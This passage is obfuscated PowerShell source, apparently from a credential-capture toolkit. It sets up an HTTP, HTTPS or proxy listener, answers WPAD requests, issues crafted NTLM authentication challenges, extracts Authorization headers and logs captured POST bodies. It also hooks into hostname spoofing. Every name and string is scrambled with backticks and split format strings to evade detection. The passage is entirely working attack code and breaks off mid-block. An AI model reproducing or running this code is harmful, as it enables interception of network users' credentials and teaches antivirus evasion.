    param (${ch`Al`lengE},${h`TTPAU`Th},${H`TTPbA`SiC`RE`AlM},${h`T`TPco`N`TENTtypE},${HT`Tp`iP},${htTpp`oRt},${Ht`TpDefA`UL`Te`xE},${HT`TpDE`Fa`U`LtFIlE},${HT`TPD`IR},${H`TTP`REse`TDELaY},${htT`P`RESEtdelA`YTiMeo`UT},${httP`Re`S`poNSE},
    ${Ht`Tps`_lISTe`NEr},${NbNSbR`UT`EF`O`RC`ePAuse},${Pr`oXy},${P`RoXYiG`NoRe},${Pr`oX`y_L`i`sTEner},${wp`Ad`AUtH},${w`p`Ada`Uth`igNOrE},${W`Padre`spo`Nse})

    function N`TLMcHa`llENGebas`e`64
    {
        param ([String]${c`HAl`leNgE},[Bool]${NtL`mE`Ss},[String]${ClIeN`TIPAD`DReSS},[Int]${Cl`i`EntpO`RT})

        ${h`TTp_`Tim`esTamp} = &("{2}{0}{1}"-f't-','Date','Ge')
        ${h`TtP_t`iMEst`A`MP} = ${H`Ttp`_`TimEstAMp}.("{0}{1}{2}" -f'ToFil','eTi','me').Invoke()
        ${hTT`P_`T`ImEstAMp} =   ( &("{2}{3}{0}{1}"-f'arI','Able','geT','-V')  Cyj6E1 ).ValUE::"to`strINg"( ( &("{0}{1}{2}" -f 'GEt-ChiLD','ITE','m')  vARiaBle:CYJ6E1).vAlue::("{2}{0}{1}" -f 'e','tBytes','G').Invoke(${h`TtP_`TimE`STAmp}))
        ${hTtp`_TiMEST`Amp} = ${Http_T`imE`sta`Mp}.("{0}{1}" -f 'Spli','t').Invoke("-") | &("{2}{1}{3}{0}" -f't','O','ForEach-','bjec'){[Char] $igU7Qm::("{1}{0}" -f 't16','ToIn').Invoke(${_},16)}

        if(${ChAlLe`N`ge})
        {
            ${HTTP_c`hAl`le`N`ge} = ${chal`lEN`GE}
            ${HT`T`p_CHal`LenGE_bYt`Es} = ${H`TT`P_chAl`leNGE}.("{2}{0}{1}"-f'se','rt','In').Invoke(2,'-').("{0}{1}" -f 'In','sert').Invoke(5,'-').("{0}{1}" -f 'Inser','t').Invoke(8,'-').("{0}{1}{2}"-f'In','s','ert').Invoke(11,'-').("{1}{0}"-f'nsert','I').Invoke(14,'-').("{1}{0}" -f 'rt','Inse').Invoke(17,'-').("{0}{1}" -f'Inse','rt').Invoke(20,'-')
            ${h`TTp`_`CHALlenge_byTes} = ${HTTP`_c`hAll`eNGe_b`yTeS}.("{0}{1}"-f'Spl','it').Invoke("-") | &("{3}{2}{0}{1}{4}" -f 'h-Obj','ec','rEac','Fo','t'){[Char] $igu7QM::("{1}{2}{0}" -f'6','ToInt','1').Invoke(${_},16)}
        }
        else
        {
            ${h`Tt`p_`chA`lLENGe_bY`TeS} = [String](1..8 | &("{3}{1}{0}{2}{4}" -f'ch-','Ea','O','For','bject') {"{0:X2}" -f (&("{1}{2}{0}" -f 'm','Get-R','ando') -Minimum 1 -Maximum 255)})
            ${HTTp_`Ch`ALlenGe} = ${Ht`Tp_`ch`ALl`e`NGe_BYT`ES} -replace ' ', ''
            ${http_ch`ALle`NG`e_b`YTes} = ${hTtp`_cHa`LLE`NG`E_B`ytEs}.("{0}{1}"-f'Sp','lit').Invoke(" ") | &("{2}{4}{1}{0}{3}" -f 'Ob','h-','For','ject','Eac'){[Char]  $iGu7qm::("{0}{2}{1}"-f 'T','t16','oIn').Invoke(${_},16)}
        }

        ${INV`e`IgH}."httP_ch`AllEnGe`_Q`UE`Ue".("{1}{0}" -f'd','Ad').Invoke(${cLIEnt`iPAD`dRe`sS} + ${clIen`TP`orT} + ',' + ${hTtP`_`chA`lleNgE})  > ${Nu`ll}

        if(${NtLM`e`ss})
        {
            ${Http`_nT`Lm_ne`GOT`i`AtIoN`_f`LAGs} = 0x05,0x82,0x89,0x0a
        }
        else
        {
            ${http`_N`TL`m_NE`GO`TiaT`I`ON_fLAgS} = 0x05,0x82,0x81,0x0a
        }

        ${Ht`Tp`_`Nt`LM_B`YTES} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                            0x00,0x00,0x00 +
                            ${h`T`Tp_NtlM_n`E`gOTia`TiO`N_fl`A`GS} +
                            ${H`TT`P_ChAlle`Ng`E_Bytes} +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                            0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                            0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                            0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                            0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                            0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                            0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                            0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                            0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                            ${hT`Tp`_`Ti`mestaMp} +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        ${N`TL`M_CHal`lE`NGE`_b`AsE64} =   (  &("{1}{0}"-f 'Ci','G')  VaRIabLe:iGU7qm).vAlUe::"tOBas`E64S`T`RiNg"(${hTtp`_n`TLm_Byt`Es})
        ${n`TLm} = ("{0}{1}" -f 'N','TLM ') + ${NtlM`_c`hALLeng`e_bas`E`64}
        ${nTlM_`CHA`LLEN`gE} = ${hT`T`p`_Cha`lLENGE}
        
        return ${nt`lM}
    }

    if(${hT`TpS_`L`IstEner})
    {
        ${HTtp_`T`Y`pE} = ("{0}{1}" -f'H','TTPS')
    }
    elseif(${PRoXY`_`LIsTe`NeR})
    {
        ${htTP`_`TypE} = ("{0}{1}"-f'Pr','oxy')
    }
    else
    {
        ${H`TTp`_`Type} = ("{0}{1}"-f'HTT','P')
    }

    if(${H`Ttp`Ip} -ne ("{1}{0}" -f'0.0.0','0.'))
    {
        ${HTTP`Ip} =   ( &('GI') vArIaBLe:xpt4ko).valUe::("{0}{1}"-f'Pars','e').Invoke(${H`Ttpip})
        ${http_EndP`O`iNT} = &("{0}{2}{1}"-f'Ne','ct','w-Obje') ("{5}{4}{1}{3}{2}{0}"-f'oint','e','ndP','t.IPE','stem.N','Sy')(${H`T`TPiP},${h`T`TPPoRt})
    }
    else
    {
        ${H`Tt`P_enDPOI`Nt} = &("{1}{2}{0}" -f '-Object','Ne','w') ("{4}{3}{0}{2}{1}" -f'N','.IPEndPoint','et','m.','Syste')( ( &("{1}{0}{2}" -f'-vaR','GET','iAblE')  ('XP'+'T4'+'KO') -vaLUeoNLY  )::"a`NY",${h`T`T`pPOrt})
    }

    ${hTT`p_R`UnN`i`NG} = ${T`RuE}
    ${H`TtP_LIs`TE`Ner} = &("{2}{0}{1}" -f'bj','ect','New-O') ("{6}{1}{2}{5}{3}{4}{0}" -f 'er','stem','.Net.Socket','TcpList','en','s.','Sy') ${hTt`P_e`N`dpOInt}
    ${htTp`_Cl`Ien`T`_ClosE} = ${T`Rue}

    if(${proXy_l`Is`Te`NEr})
    {
        ${Htt`P_Li`NgeR} = &("{2}{1}{0}{3}" -f'Obje','-','New','ct') ("{0}{9}{4}{6}{1}{5}{3}{8}{2}{7}"-f 'Sy','t.','ets.LingerOp','c','.','So','Ne','tion','k','stem')(${T`Rue},0)
        ${hTtp`_li`stenEr}."Se`RVer"."LING`ER`staTe" = ${hTT`P`_lIN`ger}
    }
    
    try
    {
        ${HT`TP`_lis`TENer}.("{0}{1}" -f 'S','tart').Invoke()
    }
    catch
    {
        ${i`Nv`EIgh}."COn`s`oLe_QuE`Ue".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - Error starting $HTTP_type listener "))
        ${H`TTp_RU`NN`I`NG} = ${fAL`Se}

        if(${Inve`IGH}."fiL`E_`oUtp`Ut")
        {
            ${InvE`i`GH}."lOG`_`FILE_Q`Ue`UE".("{1}{0}" -f'dd','A').Invoke(("$(Get-Date -format 's') - Error starting $HTTP_type listener "))
        }

        if(${In`V`eiGh}."Lo`G_outp`Ut")
        {
            ${inve`IGh}."L`og".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - Error starting $HTTP_type listener "))
        }

    }
    
    :HTTP_listener_loop while(${inV`E`igh}."RUn`N`InG" -and ${h`Ttp`_ruNnIng})
    {
        ${T`Cp`_reqUesT} = ""
        ${tcp_Re`Qu`e`S`T_Byt`es} = &("{1}{0}{2}"-f 'j','New-Ob','ect') ("{1}{3}{2}{0}{4}" -f'.Byte[','S','tem','ys',']') 4096
        ${HT`Tp`_`sEnD} = ${TR`UE}
        ${h`T`TP_hEad`er_CoN`TeNT_t`yPE} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +  $9t2jBY::"UT`F8".("{1}{2}{0}"-f 'ytes','Get','B').Invoke(("{1}{0}{2}"-f 't/ht','tex','ml'))
        ${h`TT`P`_HEa`DER`_`CaCHe_coN`TrOl} = ""
        ${hTTP_`h`EAder_AUT`HEnT`IcaTE} = ""
        ${hTtP_`HE`Ade`R_AUt`h`enticaTE_daTa} = ""
        ${h`TTP_me`S`s`AGe} = ""
        ${h`TtP_H`eaDER_aUt`HOr`Iz`ATion} = ""
        ${ht`TP`_heAdeR_Ho`st} = ""
        ${httP_he`AdE`R_`USE`R_aGENt} = ""
        ${hTtP_`REQu`esT`_`Raw_uRL} = ""
        ${nt`LM} = ("{1}{0}" -f 'M','NTL')

        while(!${HttP_`LI`Ste`N`ER}.("{1}{2}{0}" -f 'g','Pen','din').Invoke() -and !${h`T`Tp_`ClIenT}."C`ON`NeCTed")
        {

            &("{1}{0}{2}"-f'Slee','Start-','p') -m 10

            if(!${Inve`I`Gh}."R`UN`NiNg")
            {
                break ("{4}{0}{3}{1}{2}"-f'TTP','_','loop','_listener','H')
            }
        
        }

        if(${htTPs_lI`S`TEN`eR})
        {
            
            if(!${h`TTP_cL`ieNt}."c`ONNeC`TED" -or ${HTtP_C`LI`En`T_ClOse} -and ${i`NVE`Igh}."ru`NNIng")
            {
                ${htTp_`CL`I`Ent} = ${HTTP_`lisTeN`Er}.("{0}{1}{2}"-f 'A','c','ceptTcpClient').Invoke() 
	            ${HttP_CLEar`_`s`TrEaM} = ${H`Ttp_cL`i`ENt}.("{1}{0}"-f'Stream','Get').Invoke()
                ${htt`p`_`STReAm} = &("{1}{2}{0}" -f 'ect','New','-Obj') ("{5}{7}{1}{3}{0}{6}{2}{4}"-f 'Security.','t','Stre','.','am','System.N','Ssl','e')(${HttP`_`cl`EAR_stREAM},${fa`lsE})
                ${ss`L`_cErt} = (&("{0}{2}{1}"-f 'Ge','ldItem','t-Chi') (("{1}{2}{0}{4}{3}" -f 'Ma','Cer','t:2peLocal','eMy','chine2p')).("{1}{0}" -f 'LAce','ReP').Invoke('2pe','\') | &("{2}{0}{1}{3}" -f'ere','-O','Wh','bject') {${_}."sU`BjEct" -match ${iNV`eI`Gh}."cErtI`FiCa`Te_`cN"})
                ${H`TtP_ST`REAM}."A`Ut`hENTIc`AT`eASservEr"(${sS`L_Ce`Rt},${fal`SE}, (  &("{1}{2}{0}{3}"-f'-vArIAB','gE','T','le')  X7k8).vaLuE::"d`EFa`Ult",${f`ALSe})
            }

            [Byte[]]${sSL_re`Que`s`T_bYt`eS} = ${n`Ull}

            do 
            {
                ${ht`T`p_`REqU`Est_Byt`e`_`cOunT} = ${ht`T`p`_streaM}.("{0}{1}" -f'R','ead').Invoke(${t`Cp_R`eQ`U`EsT_bytes},0,${TCp_R`E`QuEST`_`Bytes}."len`gTH")
                ${s`SL_R`EQu`eST`_bYteS} += ${TCP_reQUE`s`T`_Bytes}[0..(${htTp_rEqUEst_b`y`T`E_`cOUnt} - 1)]
            } while (${Htt`p_cL`EAR_STr`eaM}."dATaA`VAIL`AbLE")

            ${t`cP`_`ReQUEsT} =   (  &("{3}{0}{2}{1}" -f'et-VaRiaB','e','L','g')  CyJ6e1  -VAlue  )::("{1}{0}" -f'g','ToStrin').Invoke(${S`sL_`R`EquEsT`_`BYTES})
        }
        else
        {

            if(!${httP`_C`LI`eNt}."c`oN`NEcted" -or ${hTtP`_clIeNt_`cL`oSE} -and ${IN`VeiGH}."R`UnniNG")
            {
                ${htTp_c`LI`enT} = ${HT`TP_LI`StENEr}.("{1}{2}{0}"-f 't','AcceptTcpCli','en').Invoke() 
	            ${H`TTp_s`TrEam} = ${hTt`P_CLI`enT}.("{2}{0}{1}" -f 't','ream','GetS').Invoke()
            }

            if(${HtTP`_STr`Eam}."d`AtAAVAi`la`Ble")
            {
                ${h`TT`p_d`ATA_Av`AiLaB`le} = ${tR`UE}
            }
            else
            {
                ${hTt`P_DAta`_a`V`AIl`A`BLe} = ${fAL`SE}
            }

            while(${hTtP`_stRE`Am}."DaT`AAV`AilAB`LE")
            {
                ${HT`TP_s`T`Ream}.("{1}{0}"-f 'd','Rea').Invoke(${tCp_`RE`QuEST_By`TEs},0,${T`c`P_REqu`ESt_`B`yteS}."lE`NGTH")
            }

            ${TCp_`RE`QuE`sT} =   ( &("{2}{0}{1}" -f 'eT-varI','AbLE','G')  ('C'+'y'+'J6E1')  -VALUEO)::("{2}{0}{1}"-f 'trin','g','ToS').Invoke(${tCp_R`EqUE`ST_b`y`Tes})
        }

        if(${t`cP_R`e`quEST} -like ("{3}{2}{0}{1}" -f'4-2','0*','45-5','47-') -or ${tcP_R`EQU`eST} -like ("{1}{0}{3}{4}{2}"-f'5-4','48-4','*','1','-44-20') -or ${TCp`_rE`QU`eST} -like ("{6}{2}{5}{0}{4}{1}{3}" -f '-','53-','0-5','20*','4e-','4-49-4f','4f-5') -or ${T`cP_r`Eq`UEst} -like ("{1}{3}{0}{2}{4}{5}"-f'4','43','e-4e-45-43','-4f-','-54','*') -or ${tcP`_reqUe`St} -like ("{2}{1}{3}{0}"-f '*','0-','5','4f-53-54'))
        {
            ${htt`P_`Ra`w_URL} = ${TCP`_reQ`U`EsT}.("{1}{0}"-f'tring','Subs').Invoke(${tcp_`Req`U`eST}.("{1}{0}" -f'dexOf','In').Invoke(("{1}{0}"-f'0-','-2')) + 4,${tC`P_reQU`EST}.("{1}{0}{2}"-f 'tri','Subs','ng').Invoke(${tCp_R`Eq`U`EsT}.("{2}{0}{1}" -f 'n','dexOf','I').Invoke(("{0}{1}" -f'-','20-')) + 1).("{0}{1}" -f 'In','dexOf').Invoke(("{1}{0}"-f '-','-20')) - 3)
            ${httP`_rAw`_urL} = ${H`Ttp_R`AW_`URl}.("{0}{1}" -f'Spl','it').Invoke("-") | &("{0}{1}{2}{3}"-f 'Fo','rEach-Ob','jec','t'){[Char]  ( &('Ls') vAriable:igu7Qm).valUe::("{0}{1}{2}" -f'ToInt','1','6').Invoke(${_},16)}
            ${HT`TP_`REQ`UeST_`RaW`_UrL} = &("{0}{2}{1}"-f 'New-O','ect','bj') ("{3}{0}{1}{2}" -f'te','m.Strin','g','Sys') (${hT`Tp_RaW`_uRl},0,${Ht`Tp_R`Aw_u`Rl}."LeN`g`TH")
            ${htt`p_`So`UrCE`_Ip} = ${Http_`cLIE`NT}."CLIE`Nt"."rEm`OtEeNdp`Oi`Nt"."ADdR`esS"."iPA`d`D`ReSStoSTR`Ing"

            if(${nbn`s`B`RuTeforcE`PAUsE})
            {
                ${i`NvEI`GH}."n`B`NS_S`TOPWa`Tch" =  $BsD::("{1}{2}{0}" -f 'tNew','St','ar').Invoke()
                ${I`NvE`Igh}."H`O`sTnA`mE_S`pOOF" = ${t`RUe}
            }
            
            if(${t`c`p_rEq`UesT} -like ("{1}{2}{3}{5}{0}{4}" -f'-20-','*','-48-','6F-73-74','*','-3A'))
            {
                ${hT`Tp_h`EA`D`e`R_HOSt_EXTRacT} = ${TC`P`_r`eQuest}.("{2}{0}{1}"-f'bs','tring','Su').Invoke(${tC`P_rEQU`esT}.("{0}{2}{1}"-f 'In','f','dexO').Invoke(("{0}{2}{1}{3}"-f '-48-6','4','F-73-7','-3A-20-')) + 19)
                ${H`Ttp_HEa`DeR`_`HOst_`eXTRaCT} = ${httP`_`headER_h`oST_eXt`RACt}.("{1}{0}" -f'bstring','Su').Invoke(0,${h`TTp_HeAde`R_hO`st_EXT`R`ACt}.("{0}{1}" -f 'I','ndexOf').Invoke(("{0}{1}"-f'-0','D-0A-')))
                ${httP_H`E`ADE`R_hOS`T_EX`TRACT} = ${HTTP_H`EadeR_`Host`_`extr`ACT}.("{0}{1}"-f'Sp','lit').Invoke("-") | &("{2}{1}{3}{0}" -f'ect','ach-','ForE','Obj'){[Char] (  &("{0}{1}"-f 'It','eM') vARiABlE:iGU7qm).vALuE::("{0}{2}{1}" -f'ToIn','6','t1').Invoke(${_},16)}
                ${htT`P_He`AdER_`HOST} = &("{0}{2}{1}" -f 'New-O','ect','bj') ("{1}{2}{0}" -f 'ng','System.','Stri') (${httP`_hEA`dER`_HOsT_EX`TRACt},0,${httP_Head`eR_hoSt_E`xT`RA`CT}."Leng`TH")
            }

            if(${T`cP_ReQ`UesT} -like ("{4}{3}{2}{7}{6}{1}{5}{0}{8}"-f'0','74-3','41','2-2D-','*-55-73-65-7','A-2','-6E-','-67-65','-*'))
            {
                ${HT`TP`_`HE`A`der_U`SeR_`AGeNt`_eXtRaCt} = ${Tcp`_R`EQUesT}.("{0}{2}{1}" -f 'Su','ing','bstr').Invoke(${TCP`_reQ`U`eST}.("{0}{2}{1}"-f 'Ind','f','exO').Invoke(("{0}{2}{3}{6}{1}{4}{5}"-f'-5','-6E-74-3A-','5-73-','65-72-2D','2','0-','-41-67-65')) + 37)
                ${H`TtP_hEaDE`R`_U`SE`R_age`NT_`exT`RAct} = ${hT`Tp`_heaDeR_uS`eR`_aGENT_E`XTrAct}.("{1}{2}{0}"-f'ring','Su','bst').Invoke(0,${H`T`Tp_`HeaDe`R_useR`_Ag`En`T_ExTRACT}.("{2}{0}{1}" -f'nd','exOf','I').Invoke(("{2}{0}{1}" -f 'D-0','A-','-0')))
                ${hT`Tp_`h`EAder_USER_A`Ge`N`T_`Extra`ct} = ${HTTp_he`AdeR`_uSer_`A`ge`N`T_extRACt}.("{1}{0}" -f'plit','S').Invoke("-") | &("{1}{4}{2}{3}{0}"-f'bject','Fo','-','O','rEach'){[Char] (  &("{1}{0}{2}" -f'ari','V','ABle')  ('iGu'+'7q'+'m')  ).VALue::("{1}{2}{0}" -f'16','ToIn','t').Invoke(${_},16)}
                ${hTT`P_H`E`Ad`ER_`UsE`R`_agENt} = &("{0}{1}{2}" -f 'New-O','bj','ect') ("{2}{0}{1}"-f 'Strin','g','System.') (${htTp_HE`ADE`R_UsE`R`_agent_`eXtRAct},0,${H`TTP_heAD`ER_`USeR_a`ge`Nt`_ExtRacT}."leNG`TH")

                if(${HTTPrES`ET`D`ElAy}."c`oUnt" -gt 0 -and (${h`TT`PreSETDeL`AY} | &("{0}{2}{1}"-f 'W','ere-Object','h') {${H`TT`P_`heAD`ER_`UsEr_aG`ENt} -match ${_}}))
                {
                    ${Ht`T`p_Res`et_D`eLAy} = ${T`RUE}
                    ${HT`TP_rE`s`E`T_Del`AY_tIm`EoUT} = &("{3}{1}{2}{0}" -f 'pan','w-','TimeS','Ne') -Seconds ${hTTPrEsET`delAy`Ti`M`EOUT}
                    ${H`T`Tp`_`RESet_del`A`y_ST`OPW`ATCh} =   (  &('LS')  VarIAblE:bsd).valUE::("{1}{0}{2}"-f'tartN','S','ew').Invoke()
                }

            }

            if(${h`Ttp`_rEquESt_RAw`_uR`L_OLD} -ne ${hT`T`p_`Request_r`AW`_URL} -or ${HttP`_cLiEN`T_hAN`dl`e_o`LD} -ne ${HTTP_CL`I`EnT}."cL`ienT"."hAN`d`lE")
            {
                ${i`N`VEIgH}."cONs`ole`_q`UeuE".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP "))
                ${I`NVE`iGh}."CO`NSolE_`quE`Ue".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP "))
                ${I`Nve`iGH}."Co`N`sOLe_qUE`UE".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent "))

                if(${iN`VEi`gH}."FILE`_`oUTp`Ut")
                {
                    ${iN`VeiGh}."LOg_`FilE`_queUE".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP "))
                    ${invE`I`Gh}."loG_FI`l`e_`Q`UeuE".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP "))
                    ${InVE`I`gH}."LOG`_FILe_`QueUe".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP "))
                }

                if(${I`NVeIgh}."l`Og_`Ou`TpuT")
                {
                    ${InvE`IGh}."l`OG".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP "))
                    ${InVE`iGH}."L`Og".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP "))
                    ${IN`VE`Igh}."L`Og".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP "))
                }

                if(${P`ROXY} -eq 'Y' -and ${pr`O`XYIGno`RE}."COu`Nt" -gt 0 -and (${prOxYI`gn`o`Re} | &("{1}{0}{2}{3}"-f 'Ob','Where-','j','ect') {${hTtp`_`HeA`d`ER_uSEr_aG`ENt} -match ${_}}))
                {
                    ${IN`VE`iGh}."CoNSOlE_`QUe`UE".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP "))

                    if(${iNv`EIGh}."fi`L`e`_OutpUt")
                    {
                        ${INVEi`gH}."L`oG_`F`IlE_`qUeue".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP "))
                    }

                    if(${iNve`i`gH}."LOg_Ou`T`put")
                    {
                        ${I`Nve`Igh}."l`Og".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP "))
                    }

                }

            }
            
            if(${tcP`_Re`Q`UEst} -like ("{1}{7}{2}{9}{3}{8}{4}{0}{6}{5}"-f'3','*','41-75-74-6','-61-74-69-','-6E-','-20-*','A','-','6F','8-6F-72-69-7A'))
            {
                ${H`Ttp`_HeaD`er_`Aut`H`O`RiZ`ATion_EXT`RacT} = ${TCP`_REQUE`st}.("{1}{2}{3}{0}" -f'g','Subst','r','in').Invoke(${t`cp`_R`eqUEst}.("{0}{2}{1}"-f'I','exOf','nd').Invoke(("{2}{6}{3}{7}{4}{8}{0}{1}{5}" -f'6E-3','A-2','-41-75-','6','-7A-61-74-69-6F','0-','74-68-','F-72-69','-')) + 46)
                ${H`Ttp`_`He`Ad`eR_aU`ThOrIZATI`On_`exTRAct} = ${hTt`P_`HEader`_AUtHor`iZatiON`_ext`Ract}.("{1}{0}{2}"-f 's','Sub','tring').Invoke(0,${htT`P_HEaDE`R_auThoR`iZA`TI`o`N_ExTrAct}.("{1}{0}"-f'f','IndexO').Invoke(("{2}{1}{0}" -f'-','-0A','-0D')))
                ${ht`TP_HE`AdeR`_`AU`THORIz`ATIO`N_e`XtrACT} = ${HTT`p_HEAdER_a`UThOr`izatI`On_EX`TRACT}.("{1}{0}"-f 'plit','S').Invoke("-") | &("{1}{0}{3}{2}"-f 'Ea','For','h-Object','c'){[Char]  $iGu7QM::("{2}{1}{0}" -f '6','t1','ToIn').Invoke(${_},16)}
                ${HTtP_hE`A`deR_`Au`TH`orI`Za`TIOn} = &("{2}{1}{0}{3}" -f'c','ew-Obje','N','t') ("{1}{0}{4}{2}{3}"-f'em','Syst','rin','g','.St') (${httP`_he`AD`eR_`Au`THOriZ`AT`Ion_extr`ACt},0,${Ht`Tp_`H`EADer_AuTHorIz`A`TiON_eX`TrAcT}."l`ENGTh")
            }

            if((${h`TTp_REQ`Uest_R`A`w_urL} -notmatch ("{0}{1}"-f '/','wpad.dat') -and ${hTT`P`A`UTh} -eq ("{2}{1}{0}" -f 'ous','onym','An')) -or (${ht`T`p_reQU`eST_r`A`w_UrL} -match ("{1}{2}{0}"-f '.dat','/wpa','d') -and ${wp`AdaUTH} -eq ("{2}{0}{1}"-f 'o','us','Anonym')) -or (
            ${Ht`Tp_`Re`qu`eST_`RAw`_UrL} -match ("{2}{0}{1}"-f'pad.','dat','/w') -and ${wP`ADaUth} -like ("{1}{0}" -f'*','NTLM') -and ${wPA`Dau`THi`gNore}."co`UnT" -gt 0 -and (${WPaDa`U`THi`gNo`Re} | &("{2}{0}{1}{3}" -f'e','re-O','Wh','bject') {${http_HE`ADE`R_UsE`R_a`genT} -match ${_}})))
            {
                ${htTp_reS`P`o`NsE_S`TA`TuS_CodE} = 0x32,0x30,0x30
                ${HTTp_R`ESp`onSE`_pH`RA`se} = 0x4f,0x4b
                ${HT`TP_`cLiEnT_cL`o`SE} = ${Tr`Ue}
            }
            else
            {

                if((${hTTp_Re`QUE`st_ra`w_`URL} -match ("{1}{0}{2}" -f'p','/w','ad.dat') -and ${wP`A`DaUTh} -eq ("{1}{0}"-f'LM','NT')) -or (${hTTP_`RE`quESt`_`RaW_uRL} -notmatch ("{0}{2}{1}"-f'/','at','wpad.d') -and ${Htt`PauTh} -eq ("{1}{0}" -f'TLM','N')))
                {
                    ${hTtp`NTl`M`ESs} = ${T`RUE}
                }
                else
                {
                    ${HtTPN`T`LM`esS} = ${fAl`SE}
                }

                if(${PrO`xy_L`IstEn`er})
                {
                    ${HttP_r`EsPONSe_`s`TaTuS`_c`OdE} = 0x34,0x30,0x37
                    ${hTTP_h`EaDeR`_`A`UTH`Ent`iCa`Te} = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    ${HtT`P_rESPonsE_`sta`T`US_Code} = 0x34,0x30,0x31
                    ${hTT`p_hEADER_aU`T`hEntI`caTe} = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                
                ${hT`TP`_`REspOn`sE_PHRA`se} = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
                ${hTtp_c`Li`e`Nt_`closE} = ${faL`Se}
            }

            if(${TcP_`REq`Ue`st} -like ("{0}{2}{1}"-f '50-4f-','3-54*','5'))
            {
                ${HTTp_`POst_R`EqUE`sT`_EXTRAct} = ${tcP`_`ReQuE`St}.("{0}{2}{1}" -f'S','tring','ubs').Invoke(${t`Cp_R`eQUest}.("{1}{0}{2}"-f'dexO','In','f').Invoke(("{0}{3}{1}{2}"-f '-0D','A-0','D-0A-','-0')) + 12)
                ${hTtP_P`OSt_r`E`qUeST_eXTRa`CT} = ${hTt`P_`POST_reQuEst_`e`XTRact}.("{1}{2}{0}"-f'ng','Substr','i').Invoke(0,${h`Ttp`_pOst_reQuesT_`EXtR`ACt}.("{2}{1}{0}" -f'Of','ndex','I').Invoke(("{0}{1}"-f'-00','-')))
                ${H`T`TP_poS`T`_REq`UES`T_`EXtraCt} = ${HTTP_`post_r`eQ`UesT`_`ExT`R`ACT}.("{1}{0}" -f'plit','S').Invoke("-") | &("{1}{0}{2}{3}"-f'r','Fo','Each-Obj','ect'){[Char] (&("{1}{0}{3}{2}"-f'vARi','geT-','LE','Ab')  ("IgU"+"7Qm")  -Val  )::("{2}{0}{1}"-f 'nt','16','ToI').Invoke(${_},16)}
                ${h`TTP_P`OsT_R`eque`St} = &("{2}{0}{1}" -f 'w-O','bject','Ne') ("{1}{0}{2}{3}"-f'.S','System','t','ring') (${hTTP_PoSt_`Re`qu`Es`T`_EXt`R`AcT},0,${H`TTp_P`ost_R`equ`es`T_e`xTrAcT}."le`Ng`Th")

                if(${HttP_po`S`T_`R`eQuest_`olD} -ne ${hT`TP`_PoST`_`RequeSt})
                {
                    ${Inv`EI`Gh}."cON`SOlE_QU`e`Ue".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type POST request $HTTP_POST_request captured from $HTTP_source_IP "))
                    ${in`VeIgH}."P`oST_Re`Qu`eST_FI`l`e_qu`eUE".("{1}{0}" -f'dd','A').Invoke(${HTtp_`P`oSt_REqu`E`sT})
